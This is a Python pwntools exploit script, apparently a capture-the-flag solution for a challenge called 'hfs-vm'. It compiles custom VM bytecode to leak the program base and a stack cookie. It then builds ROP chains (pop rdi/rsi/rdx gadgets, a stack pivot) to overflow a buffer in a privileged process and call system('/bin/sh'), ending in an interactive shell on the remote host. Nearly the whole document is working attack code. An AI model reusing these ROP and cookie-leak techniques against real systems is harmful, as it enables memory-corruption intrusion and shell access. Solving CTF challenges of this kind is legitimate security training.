from pwn import *
from subprocess import check_output

import tempfile

g_pop_rdx = 0x000000000000101d # pop rdx ; ret
g_pop_rsi = 0x000000000000198f # pop rsi ; ret
g_pop_rdi = 0x0000000000001e83 # pop rdi ; ret
g_pop_rbp = 0x0000000000000e28 # pop rbp ; ret
g_pop_rsp = 0x0000000000001112 # pop rsp ; ret

off_write = 0xc10
off_read = 0xca0

code1 = '''
BEGIN_VM
  MOVI(R_SP, 0)
  MOVI(R_SYS, SYS_LS)
  DEBUG()
  SYSCALL()

  MOVI(R_SYS, SYS_FLAG)
  SYSCALL()

  MOVI(R_SYS, SYS_WRITE)
  SYSCALL()
END_VM
'''

# - 0xe6e
leak_ret = '''
  MOVI(0, 0x37)
  SGET(13, 0)
  PUSH(13)

  MOVI(0, 0x36)
  SGET(12, 0)
  PUSH(12)

  MOVI(0, 0x35)
  SGET(11, 0)
  PUSH(11)

  MOVI(0, 0x34)
  SGET(10, 0)
  SUBI(10, 0xe6e)
  PUSH(10)
  
  MOVI(R_SYS, SYS_WRITE)
  SYSCALL()
'''

_off = 0x34

fmt_set_rel_prog = '''
  MOVI(0, 0x3 + {stk_start})
  SSET(0, 13)
  
  MOVI(0, 0x2 + {stk_start})
  SSET(0, 12)

  MOVI(0, 0x1 + {stk_start})
  MOV(1, 11)
  ADDI(1, {off[1]})
  SSET(0, 1)

  MOVI(0, 0x0 + {stk_start})
  MOV(1, 10)
  ADDI(1, {off[0]})
  SSET(0, 1)
'''
def push_rval(*val_offs):
    global _off

    ret = ''
    for val_off in val_offs:
        assert 0 <= val_off <= 0xffffffff
        ret += fmt_set_rel_prog.format(stk_start = _off, 
                off=[val_off & 0xffff, val_off >> 16])
        _off += 4
    return ret

fmt_set_zval = '''
  MOVI(1, 0)
  MOVI(0, 0x3 + {stk_start})
  SSET(0, 1)
  
  MOVI(0, 0x2 + {stk_start})
  SSET(0, 1)

  MOVI(0, 0x1 + {stk_start})
  SSET(0, 1)

  MOVI(0, 0x0 + {stk_start})
  MOVI(1, {val})
  SSET(0, 1)
'''
def push_zval(*vals):
    global _off
    ret = ''
    for val in vals:
        assert 0 <= val <= 0xffff
        ret += fmt_set_zval.format(stk_start = _off, val=val)
        _off += 4
    return ret

def rw_comm(addr, a1, a2, a3):
    return push_rval(g_pop_rdi) + push_zval(a1) + \
            push_rval(g_pop_rsi) + push_rval(a2) + \
            push_rval(g_pop_rdx) + push_zval(a3) + \
            push_rval(addr)

def do_read(a1, a2, a3):
    return rw_comm(off_read, a1, a2, a3)
def do_write(a1, a2, a3):
    return rw_comm(off_write, a1, a2, a3)

bss = 0x203800
share_mem = 0x203100

# Send code1 to get flag

###############################################
#
# Phase 1: Leak program base and pivot stack 
#
###############################################
code2 = 'BEGIN_VM\n'
code2 += leak_ret
code2 += do_write(1, share_mem, 0x8)
code2 += do_read(0, bss, 0x800)
code2 += push_rval(g_pop_rsp, bss)
code2 += '  MOVI(R_SP, 0xffff)\n' # cause a return
code2 += 'END_VM'

print(code2)
with tempfile.NamedTemporaryFile() as f:
    f.write(code2)
    f.flush()
    bytecode = check_output(['./compile.sh', f.name])

log.info('Compiled to: ' + enhex(bytecode))

#p = process('./hfs-vm')
p = remote('hfs-vm-01.play.midnightsunctf.se', 4096)

p.recvuntil('length: ')
p.sendline(str(len(bytecode)))

p.recvuntil('code: ')
p.send(bytecode)

p.recvline()
base = u64(p.recvn(8))
log.success('Base leaked: {:016x}'.format(base))
p.recvline()

share_mem = u64(p.recvn(8))
log.success('Shared mem at: {:016x}'.format(share_mem))

###############################################
#
# Phase 2: ROP to write to socket, leak kernel cookie
#
###############################################
off_signal = 0x6D5
sig_str = 'sleep'

def rw_comm(addr, a1, a2, a3):
    return struct.pack('<QQQQQQQ', base + g_pop_rdi, a1, base + g_pop_rsi, a2, 
            base + g_pop_rdx, a3, base + addr)

def rop_shell():
    exp = do_write(1, off_signal + base, 5)
    exp += do_read(0, base + bss, 0x800)
    exp += p64(base + g_pop_rsp) + p64(base + bss)
    return exp

#off_memcpy = 0xCC0
#def do_memcpy(a1, a2, a3):
#    return rw_comm(off_memcpy + base, a1, a2, a3)

#our_sd = 3
our_sd = 6 # socket fd on remote... facepalm, took me hours to figure tis out

def do_vm_syscall(sysnum, arg1, mdata, new_size = None, crash = False):
    bss2 = base + bss - 0x500
    exp = do_read(0, share_mem, len(mdata) + 2)
    exp += do_read(0, bss2, 5)
    #exp += do_read(0, bss2 - 2, 2)
    exp += do_write(our_sd, bss2, 5)

    size = len(mdata)
    if new_size:
        exp += do_write(1, off_signal + base, 5)
        #exp += do_memcpy(share_mem, bss2 - 2, 2)
        exp += do_read(0, share_mem, 2)
        size = new_size

    exp += do_read(our_sd, bss2, 2)

    if crash:
        exp += p64(0xffffffff)
    else:
        exp += do_write(1, share_mem, size + 2)
        exp += rop_shell()

    p.sendline(exp)

    time.sleep(.2)

    p.send(p16(len(mdata)) + mdata + p8(sysnum) + p16(arg1) + p16(0))
    
    if new_size:
        #time.sleep(.2)
        p.recvuntil(sig_str)
        log.info('Recv\'d signal')
        p.send(p16(new_size))

    if not crash:
        data = p.recvn(size + 2)
        log.info('Size: ' + hex(u16(data[:2])))
        p.recvuntil(sig_str)
        return data[2:]
    else:
        return None

cookie_off = 0x48
ret_off = 0x78


leak = do_vm_syscall(4, 4, 'A' * 0x48, cookie_off + 8)

cookie = leak[cookie_off:]
log.success('Leaked: ' + enhex(leak))
log.success('Leaked cookie: ' + cookie)


###############################################
#
# Phase 3: ROP on kernel and get /bin/sh system!
#
###############################################
system = base + 0xc60
final = do_read(0, base + bss, 10)
final += p64(base + g_pop_rdi) + p64(base + bss)
final += p64(system)

do_vm_syscall(5, 0, 'A' * 0x48 + cookie + 'A' * 0x28 + final, None, True)
time.sleep(1)
p.send('/bin/sh\0')

p.interactive()
